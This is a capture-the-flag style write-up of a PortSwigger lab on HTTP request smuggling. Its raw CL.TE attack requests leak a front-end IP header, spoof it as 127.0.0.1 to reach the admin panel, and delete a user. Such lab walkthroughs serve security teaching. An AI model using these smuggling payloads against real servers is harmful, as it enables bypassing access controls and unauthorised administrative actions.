# Exploiting HTTP request smuggling to reveal front-end request rewriting

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting), you'll learn: Exploiting HTTP request smuggling to reveal front-end request rewriting! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201164712.png)

According to the lab's background, there is an admin panel at `/admin`.

Let's try to access it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201164747.png)

"Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1".

That being said, if the requested is from localhost, we can access to the admin panel!

To bypass that, we can try to smuggle a request to `/admin`.

But first, we need to determind the web application is vulnerable to **CL.TE** (Front-end uses `Content-Length` header, back-end uses `Transfer-Encoding` header) or **TE.CL** (Front-end uses `Transfer-Encoding` header, back-end uses `Content-Length` header) HTTP request vulnerability.

- CL.TE:

To test that, **we can first send an attack request, then followed by a normal request.**

**Attack request:**
```http
POST / HTTP/1.1
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165234.png)

Normal request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165244.png)

As you can see, we successfully smuggled a 404 GET request, and returns HTTP status "404 Not Found".

Hence, the web application is **vulnerable to CL.TE HTTP request smuggling.**

**Now, we can try to bypass the admin panel!**
```http
POST / HTTP/1.1
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Forwarded-Host: 127.0.0.1
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165625.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165634.png)

But we still didn't bypass that...

In the lab's background, it also said: "The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name."

Armed with above information, **we can leak what header does the front-end server added.**

***To do this, we need to perform the following steps:***

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

**In the home page, we can see there is a search box:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165904.png)

Let's try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165915.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165922.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201165937.png)

As you can see, when we clicked the "Search" button, **it'll send a POST request to `/`** with parameter `search`.

Most importantly, the parameter's value is being reflected to the web page!

**Now, we can smuggle an attack request which will leak the front-end's added header:**
```http
POST / HTTP/1.1
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 750

search=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201170610.png)

> Note: Since the final request is being rewritten, we don't know how long it will end up. The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If we set this value too short, we will receive only part of the rewritten request; if we set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until we have everything of interest. In our case, the `Content-Length` header's value is set to 750.

**Normal request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201170722.png)

**Beautified:**
```http
GET / HTTP/1.1
X-SnzJQv-Ip: {Your_Public_IP}
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Cookie: session=Od0fa7ImaqUyX7NRhxxe6GgetURRg3he
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,
```

As you can see, we've leaked the `X-SnzJQv-Ip` header is the what front-end server will add!

**Now, we can smuggle that header to `127.0.0.1`. By doing that, we can bypass the access block in admin panel:**
```http
POST / HTTP/1.1
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SnzJQv-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

bypasspls=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201171646.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201171702.png)

As you can see, we can access to the admin panel!

Let's delete user `carlos`!

```http
POST / HTTP/1.1
Host: 0ad8009603349161c0da0e7f00a2009f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Transfer-Encoding: chunked

0

GET /admin/delete HTTP/1.1
X-SnzJQv-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

username=carlos&bypasspls=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-8/images/Pasted%20image%2020230201171835.png)

Nice!

# What we've learned:

1. Exploiting HTTP request smuggling to reveal front-end request rewriting